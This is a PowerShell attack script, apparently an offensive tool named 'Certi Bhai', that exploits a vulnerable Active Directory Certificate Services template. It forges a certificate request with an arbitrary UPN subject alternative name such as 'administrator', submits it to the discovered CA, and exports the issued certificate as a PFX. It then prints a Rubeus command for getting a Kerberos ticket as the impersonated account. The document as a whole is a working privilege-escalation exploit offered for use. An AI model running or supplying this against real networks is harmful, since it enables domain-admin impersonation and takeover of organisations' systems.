 param (
    [Parameter(Mandatory = $true, Position = 0)] [string]$subjectName,
    [Parameter(Mandatory = $true, Position = 1)] [string]$altName,
    [Parameter(Mandatory = $true, Position = 2)] [string]$templateName,
    [Parameter(Mandatory = $true, Position = 3)] [string]$pfxPass
) 
Write-Host ""
Write-Host "   ____            _   _    ____  _           _ "
Write-Host "  / ___|  ___ _ __| |_(_)  | __ )| |__   __ _(_)"
Write-Host " | |     / _ | '__| __| |  |  _ \| '_ \ / _ ` | |"
Write-Host " | |___ |  __| |  | |_| |  | |_) | | | | (_| | |"
Write-Host "  \____| \___|_|   \__|_|  |____/|_| |_|\__,_|_|"
Write-Host "                                            "
Write-Host "                               Because AD CS is a Pure Gold \m/  "


# Validate input
if (-not $subjectName -or -not $templateName -or -not $altName -or -not $altName) {
    Write-Host "Missing required parameters. Usage: .\cert.ps1 -subjectName 'CN=administrator, CN=Users, DC=indishell, DC=lab' -templateName 'vuln' -altName 'administrator' -pfxPass 'password'"
    exit
}

Write-Host "
#########################################################################
# Exploting vulnerable Certificate template with following informartion
# Subject name: $subjectName
# Altname: $altName
# Vulnerable template: $templateName
#########################################################################
"
$keyLength = 2048

# Create the Private Key
$PrivateKey = New-Object -ComObject X509Enrollment.CX509PrivateKey
$PrivateKey.ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
$PrivateKey.Length = $keyLength
$PrivateKey.KeySpec = 1
$PrivateKey.ExportPolicy = 1  # Exportable
$PrivateKey.ExportPolicy = $PrivateKey.ExportPolicy -bor 2 # ExportableEncrypted
$PrivateKey.MachineContext = $false
$PrivateKey.Create()

# Create a new certificate request object
$CertRequest = New-Object -ComObject X509Enrollment.CX509CertificateRequestPkcs10
$CertRequest.InitializeFromPrivateKey(0x1, $PrivateKey, "")  # ContextUser

# Set the subject name
$DN = New-Object -ComObject X509Enrollment.CX500DistinguishedName
$DN.Encode($subjectName, 0)
$CertRequest.Subject = $DN

# Set Extended Key Usage (EKU) Extensions
$EKUUsage = New-Object -ComObject X509Enrollment.CObjectIds
$OID1 = New-Object -ComObject X509Enrollment.CObjectId
$OID1.InitializeFromValue("1.3.6.1.5.5.7.3.1")  # Server Authentication
$OID2 = New-Object -ComObject X509Enrollment.CObjectId
$OID2.InitializeFromValue("1.3.6.1.5.5.7.3.2")  # Client Authentication

$EKUUsage.Add($OID1)
$EKUUsage.Add($OID2)

$EKU = New-Object -ComObject X509Enrollment.CX509ExtensionEnhancedKeyUsage
$EKU.InitializeEncode($EKUUsage)
$CertRequest.X509Extensions.Add($EKU)


$AltNames = New-Object -ComObject X509Enrollment.CAlternativeNames
$AltNameobj = New-Object -ComObject X509Enrollment.CAlternativeName
$AltNameobj.InitializeFromString(0xb,$altName)  # UPN SAN
$AltNames.Add($AltNameobj)



$SAN = New-Object -ComObject X509Enrollment.CX509ExtensionAlternativeNames
$SAN.InitializeEncode($AltNames)
$CertRequest.X509Extensions.Add($SAN)

# Create the enrollment object
$Enrollment = New-Object -ComObject X509Enrollment.CX509Enrollment
$Enrollment.InitializeFromRequest($CertRequest)

# Encode the request in-memory
$CSR = $Enrollment.CreateRequest(0)
Write-Output " [+] Generated CSR \m/ "


# Discover Certificate Authority
	$RootDSE = [ADSI]"LDAP://RootDSE"
	$ConfigDN = $RootDSE.configurationNamingContext
	$SearchBase = "LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services," + $ConfigDN

# Create a DirectorySearcher object
	$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher
	$DirectorySearcher.SearchRoot = [ADSI]$SearchBase
	$DirectorySearcher.Filter = "(objectClass=pKIEnrollmentService)"
	$DirectorySearcher.PropertiesToLoad.Add("cn") | Out-Null
	$DirectorySearcher.PropertiesToLoad.Add("dNSHostName") | Out-Null

# Execute the search
	$CAs = $DirectorySearcher.FindAll()

	$CAName = "$($CAs[0].Properties.dnshostname)\$($CAs[0].Properties.cn)"
	Write-Host " [+] Making cert request to Certificate Authotirthy: $CAName "
	$CertRequest = New-Object -ComObject CertificateAuthority.Request
	$Status = $CertRequest.Submit(0,$csr,"CertificateTemplate:$templateName",$CAName)
	$RequestID = $CertRequest.GetRequestId()

	if ($Status -eq 3) 
		{  
			Write-Output " [+] Certificate submitted successfully! Request ID is $RequestID "
			Write-Output " [+] Time to request the issued Certificate 8-) "
			$Base64 = $CertRequest.GetCertificate(1)
			$password = "$pfxPass"  
			$PemContent = $CertRequest.GetCertificate(0)

			$Base64 = $PemContent -replace "-----BEGIN CERTIFICATE-----", "" -replace "-----END CERTIFICATE-----", "" -replace "\s", ""
			$CertBytes = [Convert]::FromBase64String($Base64)
			if ($CertBytes) 
				{
				$X509Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList (, $CertBytes)
				$thumbprint= $($X509Cert.Thumbprint)
				Write-Output " [+] Requested Certificate has Thumbprint: $thumbprint"
				} 

			$Response = New-Object -ComObject X509Enrollment.CX509Enrollment
			$Response.Initialize(0x1)
			$final = $Response.InstallResponse(0,$Base64,0x1,"")

			$Certins = Get-ChildItem -Path Cert:\CurrentUser\My | where{$_.Thumbprint -eq  $thumbprint }

			if ($Certins -eq $null) 
						{
							Write-Error " Certificate not found :("
							exit 1
						}
			else {
			Write-Output " [+] Hold my TEA while I export the PFX >:D<"
			}

			$pfxPassword = ConvertTo-SecureString -String $password -Force -AsPlainText
			$pfxBytes = $certins.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, $pfxPassword)
			$base64Pfx = [Convert]::ToBase64String($pfxBytes)

			Write-Output " Use following command to obtain a TGT `n Rubeus.exe asktgt /user:$altName /password:$pfxPass /certificate:$base64Pfx /nowrap"
			Write-Output " "
		} 
		
		else 
			{
				Write-Error "Certificate request failed. Status: $Status"
				exit 1
			}
